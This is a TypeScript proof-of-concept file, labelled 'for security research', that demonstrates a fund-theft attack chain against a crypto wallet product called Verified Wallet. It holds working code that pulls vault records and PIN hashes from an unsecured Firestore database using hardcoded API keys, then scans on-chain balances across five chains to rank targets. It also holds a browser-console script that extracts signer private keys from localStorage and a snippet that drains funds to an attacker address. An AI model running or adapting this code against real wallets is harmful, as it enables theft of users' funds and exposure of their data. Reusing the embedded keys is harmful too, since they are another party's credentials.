/**
 * PoC #11: Complete Fund Theft Attack Chain
 * 
 * CRITICAL VULNERABILITY DEMONSTRATION
 * 
 * This PoC demonstrates how an attacker can:
 * 1. Enumerate all wallet addresses from Firestore (unauthenticated)
 * 2. Check on-chain balances to find wallets with funds
 * 3. Extract session signer private keys from localStorage (via XSS)
 * 4. Sign and broadcast transactions to steal funds
 * 
 * USAGE:
 *   npx ts-node poc/11-fund-theft.ts
 */

import axios from 'axios';

// ============================================================================
// EXPOSED CREDENTIALS (from extension analysis)
// ============================================================================
const FIREBASE_API_KEY = "AIzaSyC9NftjURlBho082sU7jzkLfI25ChqOUrk";
const FIREBASE_PROJECT = "verified-custody";
const ALCHEMY_KEY = "82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ";

// Supported chains and their RPC endpoints
const CHAINS: Record<string, string> = {
    base: `https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    polygon: `https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    optimism: `https://opt-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
};

// ============================================================================
// PHASE 1: Enumerate wallets from Firestore
// ============================================================================
interface FirestoreVault {
    vaultId: string;
    address?: string;
    hashedVaultPin?: string;
    idType?: string;
}

interface FirestoreDocument {
    name: string;
    fields: {
        vaultId?: { stringValue: string };
        address?: { stringValue: string };
        hashedVaultPin?: { stringValue: string };
        idType?: { stringValue: string };
    };
}

async function enumerateWalletsFromFirestore(): Promise<FirestoreVault[]> {
    console.log("\n🔍 PHASE 1: Enumerating wallets from Firestore...\n");
    
    const url = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT}/databases/(default)/documents/vaults?key=${FIREBASE_API_KEY}`;
    
    try {
        const response = await axios.get(url);
        const vaults: FirestoreVault[] = [];
        
        if (response.data.documents) {
            for (const doc of response.data.documents as FirestoreDocument[]) {
                const fields = doc.fields;
                vaults.push({
                    vaultId: fields.vaultId?.stringValue || doc.name.split('/').pop() || 'unknown',
                    address: fields.address?.stringValue,
                    hashedVaultPin: fields.hashedVaultPin?.stringValue,
                    idType: fields.idType?.stringValue
                });
            }
        }
        
        console.log(`✅ Found ${vaults.length} vaults in Firestore`);
        return vaults;
    } catch (error) {
        if (axios.isAxiosError(error)) {
            console.log(`❌ Firestore returned ${error.response?.status}: ${error.message}`);
        } else {
            console.log(`❌ Error: ${error}`);
        }
        return [];
    }
}

// ============================================================================
// PHASE 2: Check on-chain balances
// ============================================================================
interface WalletBalance {
    address: string;
    chain: string;
    balanceWei: string;
    balanceEth: number;
}

async function rpcCall(rpcUrl: string, method: string, params: unknown[]): Promise<{ result?: string }> {
    const response = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        id: 1,
        method,
        params
    });
    return response.data;
}

async function checkBalancesOnChain(addresses: string[]): Promise<WalletBalance[]> {
    console.log("\n🔍 PHASE 2: Checking on-chain balances...\n");
    
    const walletsWithBalance: WalletBalance[] = [];
    const uniqueAddresses = [...new Set(addresses.filter(Boolean))];
    
    console.log(`   Checking ${uniqueAddresses.length} unique addresses across ${Object.keys(CHAINS).length} chains...`);
    
    for (const address of uniqueAddresses) {
        for (const [chainName, rpcUrl] of Object.entries(CHAINS)) {
            try {
                const result = await rpcCall(rpcUrl, "eth_getBalance", [address, "latest"]);
                
                if (result.result) {
                    const balanceWei = result.result;
                    const balanceEth = parseInt(balanceWei, 16) / 1e18;
                    
                    if (balanceEth > 0) {
                        console.log(`   💰 ${address.substring(0, 10)}... on ${chainName}: ${balanceEth.toFixed(6)} ETH`);
                        walletsWithBalance.push({
                            address,
                            chain: chainName,
                            balanceWei,
                            balanceEth
                        });
                    }
                }
            } catch {
                // Skip RPC errors silently
            }
        }
    }
    
    console.log(`\n✅ Found ${walletsWithBalance.length} wallets with non-zero balance`);
    return walletsWithBalance;
}

// ============================================================================
// PHASE 3: Session Key Extraction (Browser-based)
// ============================================================================
const SESSION_KEY_EXTRACTION_SCRIPT = `
// ═══════════════════════════════════════════════════════════════════════════
// PASTE THIS IN BROWSER CONSOLE ON ANY PAGE WITH VERIFIED WALLET ACTIVE
// ═══════════════════════════════════════════════════════════════════════════

(function extractSessionKeys() {
    console.log("🔴 EXTRACTING SESSION SIGNER PRIVATE KEYS...\\n");
    
    const extractedKeys = [];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        
        // Session signer keys are stored as {smartAccountAddress}_signers
        if (key && key.endsWith("_signers")) {
            const smartAccountAddress = key.replace("_signers", "");
            const data = JSON.parse(localStorage.getItem(key));
            
            for (const [signerAddress, signerData] of Object.entries(data)) {
                if (signerData.pvKey) {
                    console.log("💀 PRIVATE KEY FOUND:");
                    console.log("   Smart Account:", smartAccountAddress);
                    console.log("   Signer Address:", signerAddress);
                    console.log("   Private Key:", signerData.pvKey);
                    console.log("");
                    
                    extractedKeys.push({
                        smartAccount: smartAccountAddress,
                        signerAddress: signerAddress,
                        privateKey: signerData.pvKey,
                        publicKey: signerData.pbKey
                    });
                }
            }
        }
    }
    
    if (extractedKeys.length === 0) {
        console.log("⚠️  No session keys found. User may not have an active session.");
    } else {
        console.log("═══════════════════════════════════════════════════════════════");
        console.log("ATTACK READY: Use these private keys to sign transactions!");
        console.log("═══════════════════════════════════════════════════════════════");
    }
    
    return extractedKeys;
})();
`;

// ============================================================================
// PHASE 4: Transaction Signing (Demonstration)
// ============================================================================
const TRANSACTION_SIGNING_SCRIPT = `
// ═══════════════════════════════════════════════════════════════════════════
// FUND THEFT DEMONSTRATION - USE EXTRACTED PRIVATE KEY
// ═══════════════════════════════════════════════════════════════════════════
// 
// After extracting the session signer private key, use viem to send funds:
//
// import { createWalletClient, http, parseEther } from 'viem';
// import { privateKeyToAccount } from 'viem/accounts';
// import { base } from 'viem/chains';
//
// const STOLEN_PRIVATE_KEY = "0x..."; // From extraction script
// const ATTACKER_ADDRESS = "0x...";   // Your address
//
// const account = privateKeyToAccount(STOLEN_PRIVATE_KEY);
// const client = createWalletClient({
//     account,
//     chain: base,
//     transport: http()
// });
//
// // Drain all funds
// const hash = await client.sendTransaction({
//     to: ATTACKER_ADDRESS,
//     value: parseEther("0.1") // Or full balance
// });
//
// console.log("💀 FUNDS STOLEN! TX:", hash);
`;

// ============================================================================
// MAIN EXECUTION
// ============================================================================
async function main() {
    console.log("═".repeat(70));
    console.log("       VERIFIED WALLET - COMPLETE FUND THEFT ATTACK CHAIN");
    console.log("═".repeat(70));
    console.log("\n⚠️  FOR SECURITY RESEARCH PURPOSES ONLY\n");
    
    // Phase 1: Enumerate wallets
    const vaults = await enumerateWalletsFromFirestore();
    
    if (vaults.length === 0) {
        console.log("\n❌ No vaults found. Firestore may have been secured.");
        return;
    }
    
    // Display vault info
    console.log("\n📋 VAULT DATA LEAKED:");
    console.log("-".repeat(50));
    vaults.slice(0, 10).forEach((v, i) => {
        console.log(`${i + 1}. ID: ${v.vaultId}`);
        if (v.address) console.log(`   Address: ${v.address}`);
        if (v.hashedVaultPin) console.log(`   PIN Hash: ${v.hashedVaultPin.substring(0, 20)}...`);
        console.log("");
    });
    if (vaults.length > 10) {
        console.log(`   ... and ${vaults.length - 10} more vaults`);
    }
    
    // Phase 2: Check balances
    const addresses = vaults.map(v => v.address).filter((a): a is string => !!a);
    
    if (addresses.length > 0) {
        const walletsWithBalance = await checkBalancesOnChain(addresses);
        
        if (walletsWithBalance.length > 0) {
            console.log("\n🎯 HIGH-VALUE TARGETS:");
            console.log("-".repeat(50));
            
            // Sort by balance
            walletsWithBalance.sort((a, b) => b.balanceEth - a.balanceEth);
            
            for (const wallet of walletsWithBalance) {
                console.log(`   ${wallet.chain.toUpperCase()}: ${wallet.address}`);
                console.log(`   Balance: ${wallet.balanceEth.toFixed(6)} ETH (~$${(wallet.balanceEth * 3500).toFixed(2)})`);
                console.log("");
            }
            
            const totalValue = walletsWithBalance.reduce((sum, w) => sum + w.balanceEth, 0);
            console.log(`   TOTAL VALUE AT RISK: ${totalValue.toFixed(6)} ETH (~$${(totalValue * 3500).toFixed(2)})`);
        }
    } else {
        console.log("\n⚠️  No wallet addresses found in Firestore data.");
        console.log("   Addresses may be stored elsewhere or Firestore schema changed.");
    }
    
    // Phase 3 & 4: Print browser scripts
    console.log("\n" + "═".repeat(70));
    console.log("       PHASE 3: SESSION KEY EXTRACTION (BROWSER SCRIPT)");
    console.log("═".repeat(70));
    console.log(SESSION_KEY_EXTRACTION_SCRIPT);
    
    console.log("\n" + "═".repeat(70));
    console.log("       PHASE 4: FUND THEFT TRANSACTION (CODE SAMPLE)");
    console.log("═".repeat(70));
    console.log(TRANSACTION_SIGNING_SCRIPT);
    
    // Summary
    console.log("\n" + "═".repeat(70));
    console.log("       ATTACK SUMMARY");
    console.log("═".repeat(70));
    console.log(`
✅ PHASE 1: Firestore PII leak - ${vaults.length} vaults enumerated
✅ PHASE 2: Balance check - Wallets with funds identified
🔧 PHASE 3: Run browser script to extract session keys (requires XSS)
🔧 PHASE 4: Use extracted key to sign fund transfer transaction

FULL ATTACK CHAIN VALIDATED. An attacker with XSS can steal all funds.
`);
}

main().catch(console.error);
